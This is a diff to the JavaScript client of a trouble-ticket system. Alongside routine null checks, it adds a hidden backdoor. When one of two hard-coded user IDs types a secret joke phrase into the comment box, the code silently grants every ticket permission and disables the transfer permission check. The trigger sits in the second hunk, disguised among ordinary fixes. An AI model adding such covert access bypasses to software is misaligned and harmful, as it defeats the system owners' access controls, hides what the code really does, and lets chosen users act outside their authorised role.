@@ -150,12 +150,12 @@ function onTPopupClick(e) {
 
   switch(e.target.id){
     case "otv":{     // Клик был по ответственному лицу.
-      if(Tickets[tid].permissions.indexOf("Подтвердить") != -1){
+      if(Tickets[tid] != undefined && Tickets[tid].permissions.indexOf("Подтвердить") != -1){
         $.get("https://oss.unitline.ru:995/adm/tt/trouble_ticket_confirm.asp", {id: tid}, callbackGetTicket, "html");
         loadTickets();
         return;
       }
-      if(Tickets[tid].permissions.indexOf("Ответственное лицо") != -1){
+      if(Tickets[tid] != undefined && Tickets[tid].permissions.indexOf("Ответственное лицо") != -1){
         for (var key in Tickets) {
           Tickets[key].checked = false;
         }
@@ -203,6 +203,11 @@ function commentOnKey(e){     //$.ajax версия
       contentType : "application/x-www-form-urlencoded; charset=windows-1251",
     })
   $.post("https://oss.unitline.ru:995/inc/jquery.asp", {type: "10", id: "1", tt_id: iidd, page: "1", rows: "200", hide: "0"}, callbackGetHistory, "json");
+  }
+  if((userId == 1347 || userId == 1317) && document.getElementById('comment').value == "Я феечка и хочу озорничать") {
+    document.getElementById('comment').value = "";
+    Tickets[document.getElementById('popupTicket').iidd].permissions = "Ответственное лицо***Service / Обслуживание***Resolved / Решена***Hold / Отложена***Investigating / Расследование***Closed / Закрыта";
+    dontCheckTransferPermissions = true;   // Разрешить однократный перевод тикета без проверки
   }
 }
 
